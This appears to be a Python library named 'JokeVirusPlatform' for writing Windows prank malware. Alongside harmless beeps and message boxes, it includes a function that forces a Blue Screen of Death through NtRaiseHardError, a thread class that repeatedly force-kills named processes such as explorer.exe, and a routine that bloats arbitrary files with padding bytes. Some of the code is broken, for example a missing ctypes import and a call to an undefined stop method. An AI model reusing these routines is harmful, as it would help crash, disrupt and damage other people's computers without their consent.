from ctypes import cdll,windll
from threading import Thread
from subprocess import Popen, check_output, call, PIPE, DEVNULL
from re import compile, match


ERROR_ICON = "ERROR_ICON"
WARNING_ICON = "WARNING_ICON"
QUESTION_ICON = "QUESTION_ICON"
INFO_ICON = "INFO_ICON"
MB_DEFAULT = 0xFFFFFFFF
MB_ERROR = 0x00000010


def Beep(height,time):
    """Function from C++ module windows.h to create a sound signal.
    Accepts such arguments:
    1)int heigth - pitch signal
    2)int time - time in milliseconds how long the sound will play.
    
    What returns:
    1)None
    
    Example:
    1)JokeVirusPlatform.Beep(500,1000) - make a sound with a height of 500 for 1 second
    2)JokeVirusPlatform.Beep(2000,500) - make a sound with a height of 2000 for 0.5 second"""
    kernel = cdll.LoadLibrary("kernel32.dll")
    kernel.Beep(int(height), int(time))

def Sleep(time):
    """Function from the C++ module windows.h is needed to stop the program.
    Accepts such arguments:
    1)int time - number in which indicates how many milliseconds to stop the program.
    
    What returns:
    1)None

    Example:
    1)JokeVirusPlatform.Sleep(1000) - stop the program for 1 second
    2)JokeVirusPlatform.Sleep(6000) - stop the program for 6 second
    3)JokeVirusPlatform.Sleep(500) - stop the program for 0.5 second
    """
    kernel = cdll.LoadLibrary("kernel32.dll")
    kernel.Sleep(int(time))
    
def RaiseCriticalError():
    """Call fake critical Windows error, consequences: Blue Screen of Death(BSoD).
    Doesn't take any arguments.
    
    What returns:
    1)None"""
    windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.wintypes.DWORD()))

def MessageBox(text,title,icon):
    """Function for displaying a message on the screen. Accepts such arguments: 
    1)str text - your message text
    2)str title - your title for the post
    3)str icon - ERROR_ICON, WARNING_ICON, QUESTION_ICON, INFO_ICON.
    
    What returns:
    1)If an unknown icon was passed to the function, the function returns IconError
    
    Example:
    1)JokeVirusPlatform.MessageBox(\"Function: MessageBox\",\"WARNING\",JokeVirusPlatform.WARNING_ICON) - displays a message \"Function: MessageBox\", with a title \"WARNING\", icon warning

    2)JokeVirusPlatform.MessageBox(\"Function: MessageBox\",\"ERROR\",JokeVirusPlatform.ERROR_ICON) - displays a message \"Function: MessageBox\", with a title \"ERROR\", icon error

    3)JokeVirusPlatform.MessageBox(\"Function: MessageBox\",\"INFO\",JokeVirusPlatform.INFO_ICON) - displays a message \"Function: MessageBox\", with a title \"INFO\", icon info
    
    4)JokeVirusPlatform.MessageBox(\"Function: MessageBox\",\"QUESTION\",JokeVirusPlatform.QUESTION_ICON) - displays a message \"Function: MessageBox\", with a title \"QUESTION\", icon question"""
    if icon == "ERROR_ICON":
        windll.user32.MessageBoxA(0, text.encode("cp1251"), title.encode("cp1251"),0x10)
    elif icon == "INFO_ICON":
        windll.user32.MessageBoxA(0, text.encode("cp1251"), title.encode("cp1251"),0x40)
    elif icon == "WARNING_ICON":
        windll.user32.MessageBoxA(0, text.encode("cp1251"), title.encode("cp1251"),0x30)
    elif icon == "QUESTION_ICON":
        windll.user32.MessageBoxA(0, text.encode("cp1251"), title.encode("cp1251"),0x20)
    else:
        return "IconError"

def MessageBeep(number):
    """Function that makes the sound of Windows dialog boxes. Accepts arguments like this:
    1) constant or hex number - a number that indicates which sound to emit.
    
    What returns:
    1) If the argument is not equal to the desired address or constant, a NumberError is returned
    
    Example:
    1)JokeVirusPlatform.MessageBeep(JokeVirusPlatform.MB_ERROR)
    2)JokeVirusPlatform.MessageBeep(JokeVirusPlatform.MB_DEFAULT)"""
    if number == 0xFFFFFFFF:
        user32 = cdll.LoadLibrary("user32.dll")
        user32.MessageBeep(int(number))
    elif number == 0x00000010:
        user32 = cdll.LoadLibrary("user32.dll")
        user32.MessageBeep(int(number))
    else:
        return "NumberError"
    
def GetProcessList():
    """Function that returns the entire list of all processes in Windows.
    Takes no arguments.
    
    What returns:
    1)List of all processes"""
    Calling = Popen('tasklist',shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE).stdout.readlines()
    Process = [Calling[i].decode('cp866', 'ignore').split()[0].split('.exe')[0] for i in range(3,len(Calling))]
    Processes = '\n'.join(Process)
    result = []
    temp = ""
    for i in Processes:
        if i == "\n":
            result.append(temp+".exe")
            temp = ""
        else:
            temp += i
    del temp
    del Process
    del Processes
    del Calling
    return result

class Block_Processes(Thread):
    """A class that blocks processes. Accepts arguments like this:
    1)list str data - a list in which the names of processes are stored, the main process is to add ".exe\"
    2)int or float second - a number that stops scanning processes in seconds.
    3)int step - a number that indicates how many times to scan processes.
    
    What returns:
    1)None

    Example:
    1)JokeVirusPlatform.Block_Processes([\"notepad.exe\", \"explorer.exe\"], 0.5, 50).init() - block notepad.exe and chrome.exe processes, stop scanning for 0.5 seconds, and do it 50 steps, .init() - start"""
    def __init__(self,data,second,step):
        Thread.__init__(self)
        self.data = data
        self.second = second
        self.step = step

    def run(self):
        while True:
            if self.step == 0:
                break
            else:
                Sleep(int(self.second*1000))
                for i in self.data:
                    if i in GetProcessList():
                        Popen("taskkill /F /IM "+i)
                    else:
                        pass
                self.step -= 1

    def init(self):
        thread = Block_Processes(self.data,self.second,self.step)
        thread.start()
        
def GetMacAddress():
    """Function that returns the mac address of the router.
    Takes no arguments.

    What returns:
    1)If there is no Internet access, the function returns an error GetMacAddressError"""
    macRegex = compile('[0-9a-f]{2}([-:]?)[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$')
    a = check_output('arp -a',shell=True, stderr=DEVNULL, stdin=DEVNULL)
    b = a.decode(encoding='cp866')
    c = b.find('')
    d = b[c:].split(' ')
    for b in d:
        if macRegex.match(b):
            break
    if b.find("-") != -1:
        return b.replace("-",":")
    else:
        return "GetMacAddressError"

def OpenUrl(url):
    """Opens any url by default browser. Accepts arguments:
    1)string url - your url
    
    What returns:
    1)If the protocol is not http:// or https:// the function returns an UnknownProtocolError

    Example:
    1)JokeVirusPlatform.OpenUrl(\"http://google.com\") - open url google.com, http protocol
    2)JokeVirusPlatform.OpenUrl(\"https://google.com\") - open url google.com, https protocol"""
    if url[0:7] == "http://":
        Popen("start "+url, shell=True)
    elif url[0:8] == "https://":
        Popen("start "+url, shell=True)
    else:
        return "UnknownProtocolError"

def SetWallpaper(path):
    """Function of setting desktop wallpaper. Accepts arguments:
    1)string path - full path to the image.
    
    What returns:
    1)None"""
    windll.user32.SystemParametersInfoW(20, 0, path, 0)

def SetStatusCD(status):
    """A function that opens a CD drive. Accepts arguments like this:
    1)bool status - CD drive status (True - open, False - closed)
    
    What returns:
    1)If status was not specified True or False returns UnknownStatusError
    
    Example:
    1)JokeVirusPlatform.SetStatusCD(True) - open CD drive
    2)JokeVirusPlatform.SetStatusCD(False) - close CD drive"""
    if status == True:
        windll.WINMM.mciSendStringW(u"set cdaudio door open", None, 0, None)
    elif status == False:
        windll.WINMM.mciSendStringW(u"set cdaudio door closed", None, 0, None)
    else:
        return "UnknownStatusError"

def AddSizeToFile(path,multi,size,warning = True):
    """Function that adds size to a file of any type. Accepts arguments like this:
    1)str path - path to file
    2)int multi - a number that shows how many times to increase the written bytes
    3)int size - a number that indicates the number of bytes to write
    4)bool warning - manages warnings: if True - displays warnings, if False - does not display warnings. Default True
    
    What returns:
    1)Returns PermissionError if access to file is denied
    2)If everything went well returns 0

    Example:
    1)AddSizeToFile(\"C:\\MyFiles\\Video.mp4\", 10, 1000, False) - increase Video.mp4 size by 10*1000 = 10000 bytes
    2)AddSizeToFile(\"C:\\MyFiles\\Game.exe\", 999, 10, False) - increase ga size by 999*10 = 9999 bytes"""
    if warning == True:
        if path[len(path)-4:len(path)] == ".exe":
            print("Warning: Files of type(.exe) work if their size does not exceed 4.84GB")
        elif path[len(path)-4:len(path)] == ".txt":
            print("Warning: Files of type(.txt) does not affect work")
        elif path[len(path)-4:len(path)] == ".dll":
            print("Warning: Files of type(.dll) does not affect work")
        elif path[len(path)-4:len(path)] == ".mp3":
            print("Warning: Files of type(.mp3) work at any size, but increase the length of the audio track")
        elif path[len(path)-4:len(path)] == ".lnk":
            print("Warning: Files of type(.lnk) do not disrupt the work, the best way to reduce the size of disk space")
        elif path[len(path)-4:len(path)] == ".mp4":
            print("Warning: Files of type(.mp4) does not affect work")
        else:
            print("Warning: Files of type(Unknown) not yet known")
    data = ""
    status = 0

    for i in range(multi):
        data += " "
    try:
        f = open(path,"ab")
        f.write(b"\n")
        f.close()
        for i in range(size):
            try:
                f = open(path,"ab")
                f.write(data.encode("utf-8"))
            except PermissionError:
                status = 1
                break
    except PermissionError:
        status = 1
    
    if status == 1:
        return "PermissionError"
    else:
        return 0

Block_Processes(["notepad.exe"],1,30).init()
Block_Processes(["notepad.exe"],1,30).stop()